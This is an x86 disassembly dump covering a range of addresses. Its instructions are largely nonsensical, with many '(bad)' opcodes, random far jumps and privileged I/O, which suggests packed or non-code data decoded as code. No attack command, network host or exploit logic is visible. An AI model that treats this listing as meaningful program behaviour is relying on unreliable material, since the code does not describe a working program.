  40f55d:	ror    DWORD PTR [ebx-0x3b],1
  40f560:	xchg   ebx,eax
  40f561:	mov    eax,0x3329bf5d
  40f566:	dec    esi
  40f567:	push   esp
  40f568:	jmp    0x2301:0x526824d3
  40f56f:	jno    0x40f55c
  40f571:	hlt    
  40f572:	les    esi,FWORD PTR [ecx+0x23]
  40f575:	jg     0x40f593
  40f577:	or     al,0x5c
  40f579:	push   ds
  40f57a:	xor    eax,0x14290bcd
  40f57f:	inc    edx
  40f580:	sub    dh,al
  40f582:	pop    edi
  40f583:	inc    esi
  40f584:	test   eax,esi
  40f586:	std    
  40f587:	or     dl,bl
  40f589:	mov    ecx,DWORD PTR [ebx-0x67eb6b76]
  40f58f:	stc    
  40f590:	sahf   
  40f591:	sub    eax,0xbcaf1762
  40f596:	mov    edi,0x22d5141a
  40f59b:	cmp    DWORD PTR [ecx+eax*2],ebx
  40f59e:	xchg   BYTE PTR [ecx-0x323c01d2],dl
  40f5a4:	idiv   edx
  40f5a6:	test   al,0x67
  40f5a8:	int3   
  40f5a9:	mov    al,ds:0x8cb3b576
  40f5ae:	mov    cl,0x9c
  40f5b0:	mov    ah,0x63
  40f5b2:	jno    0x40f5be
  40f5b4:	fistp  QWORD PTR [eax+ecx*2-0xcd8863f]
  40f5bc:	mov    edi,DWORD PTR [ebx+0xf78cd16]
  40f5c2:	inc    edx
  40f5c3:	enter  0x7db4,0xb1
  40f5c7:	pop    ss
  40f5c8:	hlt    
  40f5c9:	push   ds
  40f5ca:	int    0xc6
  40f5cc:	call   0x90ed:0xbacbf662
  40f5d3:	neg    dl
  40f5d5:	stc    
  40f5d6:	test   al,0x74
  40f5d8:	mov    al,0x76
  40f5da:	add    esi,edx
  40f5dc:	cmp    edi,DWORD PTR [eax-0x3839818d]
  40f5e2:	mov    bl,0xd7
  40f5e4:	int3   
  40f5e5:	out    dx,eax
  40f5e6:	iret   
  40f5e7:	mov    eax,ds:0xa9563f21
  40f5ec:	and    eax,DWORD PTR ds:0x1dff6c27
  40f5f2:	loope  0x40f622
  40f5f4:	in     eax,dx
  40f5f5:	lar    ebp,WORD PTR ds:0x7a58906
  40f5fc:	xor    esp,DWORD PTR ss:[ecx-0xd89e5a4]
  40f603:	aas    
  40f604:	add    eax,0x6ef3975f
  40f609:	mov    ch,0xe9
  40f60b:	cld    
  40f60c:	popa   
  40f60d:	(bad)  
  40f60e:	pop    ds
  40f60f:	mov    ds:0x8f8809fd,eax
  40f614:	out    0xdd,al
  40f616:	mov    ds:0x92e64503,eax
  40f61b:	leave  
  40f61c:	mov    bh,0x94
  40f61e:	xchg   dl,al
  40f620:	and    ebp,ecx
  40f622:	jle    0x40f63a
  40f624:	outs   dx,DWORD PTR ds:[esi]
  40f625:	fisttp DWORD PTR [ebx-0x35d9d657]
  40f62b:	and    BYTE PTR [ecx+0x61],dl
  40f62e:	mov    al,ds:0x52371968
  40f633:	sub    ah,al
  40f635:	pop    ds
  40f636:	loopne 0x40f6b5
  40f638:	fist   DWORD PTR [ebp-0x2d]
  40f63b:	shr    eax,0x72
  40f63e:	sbb    dl,BYTE PTR [ebp-0x514f130a]
  40f644:	mov    ecx,0xa91502e3
  40f649:	addr16 pushf 
  40f64b:	dec    edx
  40f64c:	sbb    ecx,DWORD PTR [ecx]
  40f64e:	mov    esp,0xddc555a4
  40f653:	scas   al,BYTE PTR es:[edi]
  40f654:	inc    edi
  40f655:	out    0x25,eax
  40f657:	sub    dh,BYTE PTR [ebx+0x15c45d75]
  40f65d:	add    ebx,ebp
  40f65f:	test   al,0xff
  40f661:	push   0x15533585
  40f666:	xor    eax,0x33d3be15
  40f66b:	push   cs
  40f66c:	arpl   WORD PTR [edi+0x1d0bdc2],ax
  40f672:	inc    ecx
  40f673:	xchg   ecx,eax
  40f674:	sbb    edi,DWORD PTR [ebp+0x26b143df]
  40f67a:	int    0xb1
  40f67c:	adc    DWORD PTR [esi],eax
  40f67e:	aas    
  40f67f:	and    dl,dl
  40f681:	or     edi,DWORD PTR [eax-0x6b4a13c1]
  40f687:	pop    es
  40f688:	leave  
  40f689:	xchg   esi,eax
  40f68a:	arpl   WORD PTR [edx+0x7442d599],bp
  40f690:	or     cl,BYTE PTR [esi-0x4d3699ca]
  40f696:	das    
  40f697:	aam    0xdd
  40f699:	lea    ecx,[eax+0x6c]
  40f69c:	fmul   st(7),st
  40f69e:	das    
  40f69f:	adc    ch,BYTE PTR [ebx-0x70023521]
  40f6a5:	mov    ebx,0x83832520
  40f6aa:	push   0xffffffdc
  40f6ac:	das    
  40f6ad:	in     eax,dx
  40f6ae:	adc    eax,0x569ad32e
  40f6b3:	test   eax,0xa2ec41cc
  40f6b8:	xor    eax,0x24bd8778
  40f6bd:	mov    ch,0xa1
  40f6bf:	and    ebx,DWORD PTR [edi+0x70]
  40f6c2:	or     eax,0xfc80fd3c
  40f6c7:	push   ebx
  40f6c8:	jmp    0x29bb:0x8c66b007
  40f6cf:	push   cs
  40f6d0:	fs pop ds
  40f6d2:	cmc    
  40f6d3:	pusha  
  40f6d4:	in     al,0xd8
  40f6d6:	jecxz  0x40f693
  40f6d8:	retf   0x6ed3
  40f6db:	push   edx
  40f6dc:	push   eax
  40f6dd:	xchg   edx,eax
  40f6de:	mov    dl,0x5c
  40f6e0:	push   edx
  40f6e1:	(bad)  
  40f6e3:	les    ebp,FWORD PTR [ebx-0x3b]
  40f6e6:	aad    0x73
  40f6e8:	neg    DWORD PTR [edx]
  40f6ea:	scas   eax,DWORD PTR es:[edi]
  40f6eb:	xlat   BYTE PTR ds:[ebx]
  40f6ec:	pop    DWORD PTR [esi-0x59]
  40f6ef:	jge    0x40f746
  40f6f1:	in     al,dx
  40f6f2:	mov    ds:0xd5e61ea8,al
  40f6f7:	cmp    eax,0x2
  40f6fa:	xor    DWORD PTR [ebx-0x78],ebp
  40f6fd:	ja     0x40f750
  40f6ff:	or     al,0xf4
  40f701:	(bad)
  40f704:	repz mov ecx,0x997ab3eb
  40f70a:	call   0x5f7a:0xece56e1d
  40f711:	fcom   QWORD PTR ds:0xedefa2fd
  40f717:	push   edx
  40f718:	or     BYTE PTR [ebx+ecx*1+0x795b1603],0x7f
  40f720:	and    BYTE PTR [esi-0x14bf6a68],dh
  40f726:	imul   eax,DWORD PTR [ebx+edx*2-0x71],0xbd7011cd
  40f72e:	js     0x40f6d4
  40f730:	dec    esi
  40f731:	sub    eax,0xd3e43269
  40f736:	adc    al,0x1e
  40f738:	sahf   
  40f739:	or     DWORD PTR [edi],ebp
  40f73b:	cmc    
  40f73c:	sbb    DWORD PTR [ecx],edi
  40f73e:	jae    0x40f788
  40f740:	out    0xf,al
  40f742:	retf   
  40f743:	jl     0x40f7a4
  40f745:	retf   
  40f746:	cmp    BYTE PTR [esi-0x1b],0xc
  40f74a:	inc    edi
  40f74b:	pop    ecx
  40f74c:	xchg   DWORD PTR [ebx+eax*1],ebx
  40f74f:	rcr    DWORD PTR [ebx+0x2],1
  40f752:	add    eax,0xfe225aee
  40f757:	mov    al,ds:0x249dd20a
  40f75c:	add    ebp,DWORD PTR [ecx]
  40f75e:	bound  edx,QWORD PTR [eax+ecx*2-0x6da821a8]
  40f765:	ss std 
  40f767:	or     eax,edx
  40f769:	or     ebx,DWORD PTR [esi+0x7e]
  40f76c:	inc    edx
  40f76d:	cwde   
  40f76e:	in     eax,0x8a
  40f770:	cmp    bl,dh
  40f772:	cmp    BYTE PTR [edi],0x94
  40f775:	adc    cl,BYTE PTR [ebx+0x26]
  40f778:	lea    ebx,[ecx-0x5b]
  40f77b:	data16 loopne 0x40f7b1
  40f77e:	outs   dx,BYTE PTR ds:[esi]
  40f77f:	jg     0x40f723
  40f781:	mov    cl,BYTE PTR [ebp+0x6d]
  40f784:	daa    
  40f785:	out    dx,eax
  40f786:	mov    BYTE PTR [ebp-0x77],al
  40f789:	and    BYTE PTR [edx],bh
  40f78b:	push   edx
  40f78c:	add    bh,BYTE PTR [edx+0x17]
  40f78f:	jecxz  0x40f743
  40f791:	fcmovne st,st(3)
  40f793:	rol    DWORD PTR [ecx],1
  40f795:	mov    ebp,0x12602a4
  40f79a:	cdq    
  40f79b:	sbb    DWORD PTR [edx+0x5b],0xe8ed764f
  40f7a2:	mov    edi,0x565e0198
  40f7a7:	sbb    BYTE PTR [ebx],dh
  40f7a9:	hlt    
  40f7aa:	xor    dl,BYTE PTR [edx+0x7480f55d]
  40f7b0:	pop    ecx
  40f7b1:	xor    dl,al
  40f7b3:	arpl   WORD PTR [eax+0x722d43ba],dx
  40f7b9:	cmc    
  40f7ba:	je     0x40f830
  40f7bc:	mov    edi,0x227195d6
  40f7c1:	push   ebx
  40f7c2:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40f7c4:	iret   
  40f7c5:	inc    ebx
  40f7c6:	mov    BYTE PTR [ebx],0xed
  40f7c9:	fnsave [edi-0x2f]
  40f7cc:	fs or  bh,dh
  40f7cf:	cmp    al,0x9
  40f7d1:	pop    es
  40f7d2:	pushf  
  40f7d3:	push   es
  40f7d4:	loop   0x40f78b
  40f7d6:	mov    ah,BYTE PTR [ebp+0x1f]
  40f7d9:	cmp    BYTE PTR [edi+0x14],cl
  40f7dc:	adc    DWORD PTR [edx-0x343e2a29],edi
  40f7e2:	jle    0x40f7f1
  40f7e4:	std    
  40f7e5:	loopne 0x40f864
  40f7e7:	(bad)  
  40f7e9:	(bad)  
  40f7ea:	ficomp DWORD PTR [edx+eax*8-0x232fa2e7]
  40f7f1:	daa    
  40f7f2:	cmc    
  40f7f3:	out    0x4d,al
  40f7f5:	cmp    esp,DWORD PTR [eax-0x134ce494]
  40f7fb:	test   al,0xca
  40f7fd:	adc    DWORD PTR ds:0x6d2d52a4,edx
  40f803:	pop    edi
  40f804:	packsswb mm2,mm1
  40f807:	clc    
  40f808:	arpl   cx,ax
  40f80a:	int    0x9d
  40f80c:	xlat   BYTE PTR ds:[ebx]
  40f80d:	ret    0x1a6d
  40f810:	mov    esi,DWORD PTR cs:[eax+0x371986cd]
  40f817:	stc    
  40f818:	(bad)  
  40f819:	mov    edx,0xb3388f2b
  40f81e:	stc    
  40f81f:	jl     0x40f84a
  40f821:	loopne 0x40f82c
  40f823:	jp     0x40f7cf
  40f825:	xchg   ecx,eax
  40f826:	cld    
  40f827:	idiv   DWORD PTR [edx+0x708cf6f9]
  40f82d:	xchg   esi,eax
  40f82e:	pushf  
  40f82f:	sti    
  40f830:	icebp  
  40f831:	mov    dl,0x39
  40f833:	clc    
  40f834:	repz sbb BYTE PTR [ecx],ch
  40f837:	jne    0x40f7ef
  40f839:	aam    0xef
  40f83b:	fs iret 
  40f83d:	ror    DWORD PTR [eax+0x68],1
  40f840:	jmp    DWORD PTR [ebx]
  40f842:	mov    al,0x84
  40f844:	aad    0xd6
  40f846:	mov    ch,0xcd
  40f848:	jmp    0x887:0xadfdb5c4
  40f84f:	add    DWORD PTR [edi-0x2],0xffffff9e
  40f853:	xchg   edx,eax
  40f854:	mov    ah,0x88
  40f856:	retf   
  40f857:	push   eax
  40f858:	fild   QWORD PTR [edx-0x386babcb]
  40f85e:	and    eax,0x9ce9e0dd
  40f863:	add    dl,ah
  40f865:	stc    
  40f866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f867:	sub    DWORD PTR [edi-0x67],0x322d4420
  40f86e:	div    DWORD PTR [eax+0x1904f00c]
  40f874:	jmp    0x40f897
  40f876:	jl     0x40f83e
  40f878:	neg    esi
  40f87a:	sub    ah,BYTE PTR [esi+edx*4]
  40f87d:	sub    ebp,0xa67fa957
  40f883:	pop    ecx
  40f884:	sub    BYTE PTR [ecx+0x4685f667],bl
  40f88a:	pop    esp
  40f88b:	and    BYTE PTR [eax],cl
  40f88d:	int3   
  40f88e:	dec    ebp
  40f88f:	jns    0x40f880
  40f891:	(bad)  
  40f892:	sar    DWORD PTR [esi],1
  40f894:	jmp    0x40f88f
  40f896:	mov    eax,0xe7b42cf7
  40f89b:	xchg   ecx,eax
  40f89c:	or     ecx,eax
  40f89e:	fist   DWORD PTR ds:0x3b14e483
  40f8a4:	xchg   edi,eax
  40f8a5:	adc    eax,DWORD PTR [esi-0x52c7309e]
  40f8ab:	jp     0x40f8d2
  40f8ad:	(bad)  
  40f8b0:	mov    ?,ecx
  40f8b2:	mov    ds:0x7b750275,al
  40f8b7:	mov    ah,0x8
  40f8b9:	sahf   
  40f8ba:	out    0x41,al
  40f8bc:	add    eax,0x685dd2fe
  40f8c1:	xchg   edi,eax
  40f8c2:	out    0x7d,al
  40f8c4:	das    
  40f8c5:	fiadd  WORD PTR [edi-0x7d]
  40f8c8:	push   0x2503181e
  40f8cd:	call   0x32eda7ca
  40f8d2:	mov    edi,0xec71ce86
  40f8d7:	stc    
  40f8d8:	mov    ebx,edx
  40f8da:	jmp    0x4dd1:0x3d112a9a
  40f8e1:	fst    QWORD PTR [ecx]
  40f8e3:	xchg   esi,eax
  40f8e4:	into   
  40f8e5:	xor    eax,DWORD PTR [esi]
  40f8e7:	js     0x40f874
  40f8e9:	leave  
  40f8ea:	fidivr WORD PTR [edx-0x205a27e5]
  40f8f0:	jg     0x40f94d
  40f8f2:	mov    esi,0x477afd6e
  40f8f7:	daa    
  40f8f8:	int    0x57
  40f8fa:	jmp    0x5d13ae1b
  40f8ff:	mov    ah,bl
  40f901:	and    al,0xf6
  40f903:	mov    esp,0x9e642baf
  40f908:	push   es
  40f909:	lea    ebx,[eax]
  40f90b:	test   al,0x29
  40f90d:	sbb    al,0xa2
  40f90f:	xchg   ecx,eax
  40f910:	sbb    esi,DWORD PTR [edi+0x19b86d9c]
  40f916:	scas   eax,DWORD PTR es:[edi]
  40f917:	outs   dx,BYTE PTR ds:[esi]
  40f918:	jbe    0x40f8a5
  40f91a:	les    esi,FWORD PTR [eax]
  40f91c:	shl    BYTE PTR [edx],cl
  40f91e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f91f:	add    eax,0xae355194
  40f924:	out    0x12,al
  40f926:	adc    DWORD PTR [ecx+ecx*8+0x78b94587],ebp
  40f92d:	jbe    0x40f91e
  40f92f:	pop    ds
  40f930:	mov    esi,0x92f0812c
  40f935:	or     DWORD PTR [esi+0x4c9bd51e],ebp
  40f93b:	sbb    eax,0x1a33ca50
  40f940:	and    DWORD PTR ds:0xd360c4cc,edi
  40f946:	in     al,0xa
  40f948:	adc    al,0x90
  40f94a:	test   ecx,0x9269f167
  40f950:	into   
  40f951:	and    al,dh
  40f953:	xor    dl,BYTE PTR [esi+ecx*2]
  40f956:	imul   bh
  40f958:	inc    DWORD PTR [esi-0x7b]
  40f95b:	inc    edx
  40f95c:	xchg   ebp,eax
  40f95d:	setge  BYTE PTR [ebp+0x3ef0e24b]
  40f964:	pop    ebx
  40f965:	or     al,0xbf
  40f967:	pushf  
  40f968:	fadd   DWORD PTR [ebx-0x5afe1b4e]
  40f96e:	(bad)  
  40f96f:	sbb    DWORD PTR [ebx-0x3],edx
  40f972:	fdiv   st(1),st
  40f974:	dec    esp
  40f975:	cmc    
  40f976:	ins    DWORD PTR es:[edi],dx
  40f977:	xchg   ebx,eax
  40f978:	rcl    BYTE PTR [ebp-0x30],1
  40f97b:	or     ebx,edx
  40f97d:	jecxz  0x40f99c
  40f97f:	dec    ebx
  40f980:	dec    edi
  40f981:	daa    
  40f982:	mov    bh,0x5f
  40f984:	imul   ecx,DWORD PTR [ebx+0x180f74e1],0x9d78feb2
  40f98e:	xor    BYTE PTR [esi],ch
  40f990:	mov    bl,0x9
  40f992:	lds    edx,FWORD PTR [edx]
  40f994:	scas   al,BYTE PTR es:[edi]
  40f995:	or     al,0x59
  40f997:	div    DWORD PTR [edx+0x297a3347]
  40f99d:	int3   
  40f99e:	pop    ds
  40f99f:	fsubr  DWORD PTR [ebp-0x5]
  40f9a2:	lahf   
  40f9a3:	inc    esp
  40f9a4:	xor    al,0x4d
  40f9a6:	(bad)  
  40f9a7:	out    0x86,al
  40f9a9:	shl    DWORD PTR [ecx],0x36
  40f9ac:	(bad)  
  40f9ad:	stos   BYTE PTR es:[edi],al
  40f9ae:	adc    eax,0x20bf6c2b
  40f9b3:	or     dl,BYTE PTR [ecx-0x3c9ee55c]
  40f9b9:	cmp    DWORD PTR [ebp+0x22],edi
  40f9bc:	jmp    0x8755fdd
  40f9c1:	ror    DWORD PTR [esi+0x14cfd558],cl
  40f9c7:	sahf   
  40f9c8:	fcom   DWORD PTR [ebp+0x7fc98941]
  40f9ce:	lods   al,BYTE PTR ds:[esi]
  40f9cf:	outs   dx,BYTE PTR ds:[esi]
  40f9d0:	pop    edx
  40f9d1:	xchg   esi,eax
  40f9d2:	icebp  
  40f9d3:	push   ebp
  40f9d4:	in     al,0x68
  40f9d6:	inc    esp
  40f9d7:	push   edx
  40f9d8:	hlt    
  40f9d9:	dec    esi
  40f9da:	sbb    BYTE PTR [esi+0x20841ce4],cl
  40f9e0:	(bad)  
  40f9e1:	push   ecx
  40f9e2:	ret    0xe86f
  40f9e5:	mov    cs,edi
  40f9e7:	rcr    bl,1
  40f9e9:	lods   al,BYTE PTR ds:[esi]
  40f9ea:	out    dx,al
  40f9eb:	mov    bh,0xa
  40f9ed:	cmc    
  40f9ee:	adc    al,0x78
  40f9f0:	mov    ah,0x3
  40f9f2:	ror    BYTE PTR [esi+eax*1+0x1be13fea],cl
  40f9f9:	aas    
  40f9fa:	jne    0x40f9c9
  40f9fc:	aad    0xb7
  40f9fe:	xchg   DWORD PTR [edx+0x1377f48],edi
  40fa04:	lahf   
  40fa05:	ret    
  40fa06:	sub    edx,eax
  40fa08:	arpl   WORD PTR [eax+0x45],dx
  40fa0b:	cmp    dl,BYTE PTR [ebp+0x4c]
  40fa0e:	ret    
  40fa0f:	mov    ds:0xb0bf193f,al
  40fa14:	ins    BYTE PTR es:[edi],dx
  40fa15:	adc    eax,0xa0eff4d7
  40fa1a:	pop    edx
  40fa1b:	lock stos BYTE PTR es:[edi],al
  40fa1d:	bound  edi,QWORD PTR [ebx-0x2cb5b6fb]
  40fa23:	outs   dx,BYTE PTR ds:[esi]
  40fa24:	leave  
  40fa25:	daa    
  40fa26:	and    DWORD PTR [esp+ecx*2+0x27ffb8fa],ebx
  40fa2d:	mov    cl,0x5a
  40fa2f:	rol    ch,0xf5
  40fa32:	out    0x82,eax
  40fa34:	mov    eax,ds:0x937ea054
  40fa39:	lods   eax,DWORD PTR ds:[esi]
  40fa3a:	inc    esi
  40fa3b:	inc    esi
  40fa3c:	jno    0x40f9e7
  40fa3e:	push   edx
  40fa3f:	dec    ebp
  40fa40:	gs dec ebp
  40fa42:	lods   al,BYTE PTR ds:[esi]
  40fa43:	inc    ebp
  40fa44:	out    dx,eax
  40fa45:	cli    
  40fa46:	pop    edi
  40fa47:	push   ds
  40fa48:	pop    esp
  40fa49:	pop    ebx
  40fa4a:	(bad)  
  40fa4b:	popf   
  40fa4c:	pop    ebp
  40fa4d:	inc    esi
  40fa4e:	push   ebp
  40fa4f:	pop    esp
  40fa50:	bound  esp,QWORD PTR [edx-0x5d27cdda]
  40fa56:	in     eax,dx
  40fa57:	mov    cl,0xfb
  40fa59:	push   ds
  40fa5a:	push   esp
  40fa5b:	add    cl,BYTE PTR [edi-0x3a09d422]
  40fa61:	retf   
  40fa62:	cs sub al,0xf
  40fa65:	rol    DWORD PTR [esi-0x8535fc4],1
  40fa6b:	cmp    eax,0x5005a234
  40fa70:	inc    ecx
  40fa71:	jnp    0x40faae
  40fa73:	jnp    0x40f9fe
  40fa75:	(bad)  
  40fa76:	adc    al,0xa7
  40fa78:	popa   
  40fa79:	mov    edi,0x3349e39c
  40fa7e:	sub    esp,eax
  40fa80:	rcr    DWORD PTR [ebx+edi*8+0x2a373525],1
  40fa87:	inc    eax
  40fa88:	test   al,0x7b
  40fa8a:	aad    0xf8
  40fa8c:	and    eax,0x6f1d7bed
  40fa91:	mov    ah,0x1c
  40fa93:	fdiv   st(6),st
  40fa95:	cmp    DWORD PTR [edx+ebp*2-0x30],ebx
  40fa99:	xchg   ebp,eax
  40fa9a:	xor    al,0x6d
  40fa9c:	shl    DWORD PTR [ecx+0x52686f7c],0x85
  40faa3:	outs   dx,BYTE PTR ds:[esi]
  40faa4:	popa   
  40faa5:	mov    dl,bl
  40faa7:	out    dx,al
  40faa8:	xchg   esi,eax
  40faa9:	fsubr  st(4),st
  40faab:	lods   al,BYTE PTR ds:[esi]
  40faac:	daa    
  40faad:	mov    ebx,0xba9273f6
  40fab2:	repz clc 
  40fab4:	repnz mov edx,DWORD PTR [ecx-0x1b]
  40fab8:	mov    ecx,0x86b59ed5
  40fabd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fabe:	mov    cs,WORD PTR [ebx+ecx*2-0x547eae07]
  40fac5:	sub    BYTE PTR [ecx+0x7ad8ee09],dl
  40facb:	inc    esi
  40facc:	popf   
  40facd:	int    0xf0
  40facf:	xchg   esi,eax
  40fad0:	push   esi
  40fad1:	mov    al,0x80
  40fad3:	imul   esi,ebx,0x4a
  40fad6:	adc    BYTE PTR [esi-0x6f],cl
  40fad9:	repnz mov edx,0x7e4263a7
  40fadf:	mov    al,BYTE PTR [ebp+0x22]
  40fae2:	adc    BYTE PTR [esi+0x1d760c86],ch
  40fae8:	adc    BYTE PTR [edx-0x46f016a7],bh
  40faee:	mov    bh,0x1f
  40faf0:	push   ebp
  40faf1:	mov    al,0x95
  40faf3:	mov    al,ds:0x971292ee
  40faf8:	sbb    eax,0x420c9f9c
  40fafd:	cmp    DWORD PTR [ebp+0x6f],esi
  40fb00:	hlt    
  40fb01:	xchg   esi,eax
  40fb02:	mov    bl,0xc
  40fb04:	pop    ecx
  40fb05:	inc    esi
  40fb06:	xchg   edx,eax
  40fb07:	shl    BYTE PTR [edx-0x4c],1
  40fb0a:	(bad)  
  40fb0b:	es adc ebp,eax
  40fb0e:	outs   dx,BYTE PTR ds:[esi]
  40fb0f:	test   BYTE PTR [ecx-0x24e9a49],ah
  40fb15:	aam    0xc6
  40fb17:	mov    al,0xe5
  40fb19:	addr16 adc ecx,0xffffffbc
  40fb1d:	xchg   ecx,eax
  40fb1e:	push   es
  40fb1f:	cmp    eax,0xfff0ebb8
  40fb24:	mov    bl,0xbc
  40fb26:	push   cs
  40fb27:	loopne 0x40fad9
  40fb29:	mov    esp,0x7672e292
  40fb2e:	adc    DWORD PTR [edi],esp
  40fb30:	adc    edx,DWORD PTR [eax-0x1c]
  40fb33:	inc    ebx
  40fb34:	pop    esp
  40fb35:	imul   esi,ebx,0x433a157e
  40fb3b:	lods   eax,DWORD PTR ds:[esi]
  40fb3c:	dec    esi
  40fb3d:	xor    BYTE PTR [edx-0x2e168714],dh
  40fb43:	aad    0x8a
  40fb45:	mov    ecx,0xe6f83782
  40fb4a:	pusha  
  40fb4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb4c:	inc    ecx
  40fb4d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb4f:	ds sahf 
  40fb51:	es loopne 0x40fbb7
  40fb54:	aad    0xb2
  40fb56:	mov    al,0x97
  40fb58:	sub    dh,BYTE PTR [esi+0x7e]
  40fb5b:	fadd   QWORD PTR [bp+di+0x12]
  40fb5f:	fwait
  40fb60:	add    dl,bl
  40fb62:	lea    edi,fs:0x4143ce53
  40fb69:	adc    eax,0x9e1f9d9d
  40fb6e:	(bad)  
  40fb6f:	in     eax,0x96
  40fb71:	ja     0x40faf3
  40fb73:	xchg   ecx,eax
  40fb74:	xchg   ecx,eax
  40fb75:	xor    ebp,esp
  40fb77:	mov    ecx,0xa79abf4e
  40fb7c:	dec    ebx
  40fb7d:	mov    dh,BYTE PTR [eax+0x37]
  40fb80:	cmp    al,0xc7
  40fb82:	and    BYTE PTR [ecx+0x50af0c7a],dl
  40fb88:	xlat   BYTE PTR ds:[ebx]
  40fb89:	lock mov al,0xc5
  40fb8c:	test   DWORD PTR [ebp-0x53],esi
  40fb8f:	retf   
  40fb90:	xchg   esp,eax
  40fb91:	leave  
  40fb92:	lahf   
  40fb93:	sbb    BYTE PTR [edi],ah
  40fb95:	das    
  40fb96:	jg     0x40fb1f
  40fb98:	and    ch,BYTE PTR [edx+ebp*8-0x2e]
  40fb9c:	cdq    
  40fb9d:	shl    BYTE PTR [edi+0x1e4ce232],0x4b
  40fba4:	xor    ecx,edi
  40fba6:	dec    esi
  40fba7:	sar    DWORD PTR [eax-0x3e9d0f58],cl
  40fbad:	(bad)  
  40fbae:	je     0x40fbc4
  40fbb0:	cmp    BYTE PTR [esi+0x1e],cl
  40fbb3:	ret    0xc6c2
  40fbb6:	adc    edx,DWORD PTR [ebx+0x373844c]
  40fbbc:	aaa    
  40fbbd:	lahf   
  40fbbe:	inc    edi
  40fbbf:	dec    ecx
  40fbc0:	rcl    BYTE PTR [ebx-0x4373ba5b],0x44
  40fbc7:	pop    ds
  40fbc8:	int    0x91
  40fbca:	stos   BYTE PTR es:[edi],al
  40fbcb:	sub    BYTE PTR [eax+edi*8+0x3d776817],bl
  40fbd2:	cli    
  40fbd3:	je     0x40fb7d
  40fbd5:	outs   dx,DWORD PTR ds:[esi]
  40fbd6:	int3   
  40fbd7:	pop    edx
  40fbd8:	jns    0x40fb7d
  40fbda:	loop   0x40fbfd
  40fbdc:	or     DWORD PTR [ecx+0x75947086],esi
  40fbe2:	imul   edi,ebx,0x3b
  40fbe5:	(bad)  
  40fbe6:	fisubr WORD PTR [esi]
  40fbe8:	cdq    
  40fbe9:	push   edx
  40fbea:	les    edx,FWORD PTR [ebp+eiz*1-0x4c]
  40fbee:	xor    ah,BYTE PTR [ecx]
  40fbf0:	or     al,0x8
  40fbf2:	das    
  40fbf3:	push   cs
  40fbf4:	dec    esp
  40fbf5:	ss loop 0x40fbd5
  40fbf8:	pushf  
  40fbf9:	fnstenv [eax]
  40fbfb:	aam    0x9
  40fbfd:	test   al,0xa1
  40fbff:	sub    BYTE PTR [edi+esi*4-0xb],ah
  40fc03:	or     al,0x2e
  40fc05:	rcr    BYTE PTR [edx],cl
  40fc07:	jge    0xb1f67a72
  40fc0d:	push   ebp
  40fc0e:	sar    BYTE PTR [edi-0x6a48853b],0x6e
  40fc15:	mov    ebx,0x26776e82
  40fc1a:	loope  0x40fc5b
  40fc1c:	pop    edx
  40fc1d:	pop    esi
  40fc1e:	call   0xbb0bbd05
  40fc23:	(bad)  
  40fc25:	out    0x68,ax
  40fc28:	jb     0x40fc97
  40fc2a:	add    dh,ch
  40fc2c:	dec    esp
  40fc2d:	jge    0x40fbce
  40fc2f:	fs pop esp
  40fc31:	mov    cl,0xf1
  40fc33:	call   0x300aad20
  40fc38:	mov    ds:0xe524b80c,al
  40fc3d:	retf   
  40fc3e:	inc    edi
  40fc3f:	test   ecx,0xa5022be4
  40fc45:	repz inc esp
  40fc47:	mov    ch,0x7c
  40fc49:	lock mov esp,DWORD PTR [eax]
  40fc4c:	lods   al,BYTE PTR ds:[esi]
  40fc4d:	mov    bh,0x52
  40fc4f:	shl    BYTE PTR [esi+0x2282b4ca],0x0
  40fc56:	push   eax
  40fc57:	or     al,0x6f
  40fc59:	out    0xc8,al
  40fc5b:	rol    BYTE PTR [esi+esi*1+0x31295337],0x46
  40fc63:	nop
  40fc64:	dec    edx
  40fc65:	in     eax,0xd2
  40fc67:	jo     0x40fcca
  40fc69:	or     BYTE PTR [ebx+0x71a4c0ab],bh
  40fc6f:	jmp    0x219f41fa
  40fc74:	sbb    eax,0x2b0908f
  40fc79:	push   es
  40fc7a:	icebp  
  40fc7b:	(bad)  
  40fc7c:	cmc    
  40fc7d:	hlt    
  40fc7e:	push   0xffffffad
  40fc80:	xor    al,0x16
  40fc82:	mov    ch,0x75
  40fc84:	out    dx,eax
  40fc85:	dec    ecx
  40fc86:	pop    edi
  40fc87:	pop    edi
  40fc88:	out    0xde,al
  40fc8a:	and    bh,0xdf
  40fc8d:	sti    
  40fc8e:	test   BYTE PTR [eax],ch
  40fc90:	sub    eax,0xd31a5579
  40fc95:	mov    WORD PTR [esi+0x0],?
	...
  40fd14:	fdiv   QWORD PTR [ecx]
  40fd16:	mov    eax,0xfedbfd5a
  40fd1b:	mov    bh,0xdd
  40fd1d:	xchg   edx,eax
  40fd1e:	iret   
  40fd1f:	mov    DWORD PTR [edx+0x2e],edx
  40fd22:	(bad)  
  40fd23:	(bad)  
  40fd24:	in     al,dx
  40fd25:	test   al,0x0
  40fd27:	add    BYTE PTR [ebx+0x7],ch
  40fd2a:	add    BYTE PTR [eax],al
  40fd2c:	mov    fs,WORD PTR [edi]
  40fd2e:	and    DWORD PTR [esi+eiz*8],0x1798e894
  40fd35:	std    
  40fd36:	pop    ecx
  40fd37:	xchg   ebx,eax
  40fd38:	ds iret 
  40fd3a:	jmp    0x40fcce
  40fd3c:	fwait
  40fd3d:	cmp    eax,0xddaf7c10
  40fd42:	pop    ebp
  40fd43:	sti    
  40fd44:	push   edi
  40fd45:	xor    dh,BYTE PTR [esi]
  40fd47:	test   bh,cl
  40fd49:	ss push ss
  40fd4b:	(bad)  
  40fd4c:	rcr    edi,cl
  40fd4e:	push   ebx
  40fd4f:	ja     0x40fd52
  40fd51:	rol    DWORD PTR [esi+eiz*1+0x33107776],1
  40fd58:	mov    ds:0xc01454f2,eax
  40fd5d:	loopne 0x40fd56
  40fd5f:	add    al,0x95
  40fd61:	lods   al,BYTE PTR ds:[esi]
  40fd62:	aas    
  40fd63:	or     BYTE PTR [edx-0x54],cl
  40fd66:	adc    al,0x5c
  40fd68:	sbb    edi,DWORD PTR [eax+0xf]
  40fd6b:	mov    al,ds:0xf95ae6a
  40fd70:	and    al,BYTE PTR [esi-0x2d1e2f47]
  40fd76:	pop    ds
